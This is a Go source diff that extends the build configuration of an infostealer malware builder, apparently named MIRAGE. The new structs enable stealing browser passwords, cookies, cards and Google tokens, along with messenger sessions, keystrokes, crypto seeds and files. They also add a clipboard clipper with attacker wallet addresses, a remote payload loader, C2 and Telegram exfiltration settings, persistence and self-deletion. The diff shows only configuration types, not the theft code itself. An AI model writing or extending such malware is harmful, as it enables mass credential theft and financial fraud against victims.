@@ -16,42 +16,128 @@ import (
 
 const configSignature = "MIRAGECFG"
 
+// ── Module toggles (Volta/Remus-style) ─────────────────────────
+
+type ChromiumModules struct {
+	Enabled      bool `json:"enabled"`
+	Passwords    bool `json:"passwords"`
+	Cookies      bool `json:"cookies"`
+	Cards        bool `json:"cards"`
+	History      bool `json:"history"`
+	Autofill     bool `json:"autofill"`
+	Bookmarks    bool `json:"bookmarks"`
+	GoogleTokens bool `json:"google_tokens"`
+	CdpGrab      bool `json:"cdp_grab"`
+	RawExport    bool `json:"raw_export"`
+	KillBrowsers bool `json:"kill_browsers"`
+}
+
+type FirefoxModules struct {
+	Enabled   bool `json:"enabled"`
+	Passwords bool `json:"passwords"`
+	Cookies   bool `json:"cookies"`
+	History   bool `json:"history"`
+}
+
+type MessengersModules struct {
+	Discord         bool     `json:"discord"`
+	Telegram        bool     `json:"telegram"`
+	TelegramClients []string `json:"telegram_clients"`
+	Signal          bool     `json:"signal"`
+	WhatsApp        bool     `json:"whatsapp"`
+	Skype           bool     `json:"skype"`
+	Viber           bool     `json:"viber"`
+	Element         bool     `json:"element"`
+	Session         bool     `json:"session"`
+	Tox             bool     `json:"tox"`
+	ICQ             bool     `json:"icq"`
+	Pidgin          bool     `json:"pidgin"`
+	Outlook         bool     `json:"outlook"`
+}
+
+type SystemModules struct {
+	SystemInfo   bool `json:"system_info"`
+	WiFi         bool `json:"wifi"`
+	Screenshot   bool `json:"screenshot"`
+	Keylogger    bool `json:"keylogger"`
+	SeedGrabber  bool `json:"seed_grabber"`
+	Clipboard    bool `json:"clipboard"`
+}
+
+type ClipperModules struct {
+	Enabled  bool     `json:"enabled"`
+	Coins    []string `json:"coins"`
+	BTCAddr  string   `json:"btc_addr"`
+	ETHAddr  string   `json:"eth_addr"`
+	TRXAddr  string   `json:"trx_addr"`
+	XMRAddr  string   `json:"xmr_addr"`
+	SOLAddr  string   `json:"sol_addr"`
+	TONAddr  string   `json:"ton_addr"`
+}
+
+type GrabberModules struct {
+	Enabled    bool     `json:"enabled"`
+	Extensions []string `json:"extensions"`
+	MaxSizeMB  int      `json:"max_size_mb"`
+	MaxDepth   int      `json:"max_depth"`
+	Paths      []string `json:"paths"`
+}
+
+type LoaderModules struct {
+	Enabled bool   `json:"enabled"`
+	URL     string `json:"url"`
+}
+
+type AntiDuplicateConfig struct {
+	BanHWID     bool `json:"ban_hwid"`
+	BanIP       bool `json:"ban_ip"`
+	BanTimeoutH int  `json:"ban_timeout_h"`
+}
+
+type ProxyGateConfig struct {
+	Enabled  bool   `json:"enabled"`
+	Type     string `json:"type"`
+	SourceID string `json:"source_id"`
+}
+
 type Modules struct {
-	Passwords  bool `json:"passwords"`
-	Cookies    bool `json:"cookies"`
-	Cards      bool `json:"cards"`
-	Wallets    bool `json:"wallets"`
-	Messengers bool `json:"messengers"`
-	Gaming     bool `json:"gaming"`
-	Vpn        bool `json:"vpn"`
-	Keylogger  bool `json:"keylogger"`
-	Webcam     bool `json:"webcam"`
-	Screenshot bool `json:"screenshot"`
+	Chromium   ChromiumModules   `json:"chromium"`
+	Firefox    FirefoxModules    `json:"firefox"`
+	Wallets    bool              `json:"wallets"`
+	Messengers MessengersModules `json:"messengers"`
+	System     SystemModules     `json:"system"`
+	Clipper    ClipperModules    `json:"clipper"`
+	Grabber    GrabberModules    `json:"grabber"`
+	Loader     LoaderModules     `json:"loader"`
+	Gaming     bool              `json:"gaming"`
+	Vpn        bool              `json:"vpn"`
+	TwoFA      bool              `json:"twofa"`
+	Passman    bool              `json:"passman"`
 }
 
 type BuildConfig struct {
-	C2Host            string   `json:"c2_host"`
-	C2Port            int      `json:"c2_port"`
-	ApiKey            string   `json:"api_key"`
-	TelegramToken     string   `json:"telegram_token"`
-	TelegramChatID    string   `json:"telegram_chat_id"`
-	EnablePersistence bool     `json:"enable_persistence"`
-	EnableScreenshot  bool     `json:"enable_screenshot"`
-	EnableGrabber     bool     `json:"enable_grabber"`
-	IncludeDecryptor  bool     `json:"include_decryptor"`
-	BuildTag          string   `json:"build_tag"`
-	StartupDelayMs    int      `json:"startup_delay_ms"`
-	DomainDetect      []string `json:"domain_detect"`
-	Modules           Modules  `json:"modules"`
-	NotifyBots        []string `json:"notify_bots"`
+	BuildName   string `json:"build_name"`
+	BuildTag    string `json:"build_tag"`
+	IconData    []byte `json:"icon_data,omitempty"`
+	ManifestXML []byte `json:"manifest_xml,omitempty"`
 
-	// Hardening config — override compiled-in defaults at runtime
-	EvasionThreshold int    `json:"evasion_score_threshold,omitempty"` // 0 = use compiled default
-	CdpGrab          bool   `json:"cdp_grab,omitempty"`                // enable CDP cookie extraction
-	RawExport        bool   `json:"raw_export,omitempty"`              // enable raw DB file export
-	KillBrowsers     bool   `json:"kill_browsers,omitempty"`           // kill browser before collect
-	Socks5Host       string `json:"socks5_host,omitempty"`             // override SOCKS5 proxy host
-	Socks5Port       int    `json:"socks5_port,omitempty"`             // override SOCKS5 proxy port
+	C2Host  string `json:"c2_host"`
+	C2Port  int    `json:"c2_port"`
+	C2Token string `json:"c2_token"`
+
+	TelegramToken  string `json:"telegram_token"`
+	TelegramChatID string `json:"telegram_chat_id"`
+
+	AntiDuplicate AntiDuplicateConfig `json:"anti_duplicate"`
+	ProxyGate     ProxyGateConfig     `json:"proxy_gate"`
+
+	Modules         Modules `json:"modules"`
+	Persistence     bool    `json:"persistence"`
+	SelfDelete      bool    `json:"self_delete"`
+	StartupDelayMS  int     `json:"startup_delay_ms"`
+	Socks5Host      string  `json:"socks5_host"`
+	Socks5Port      int     `json:"socks5_port"`
+	IncludeDecryptor bool   `json:"include_decryptor"`
 }
 
 type BuildService struct{}
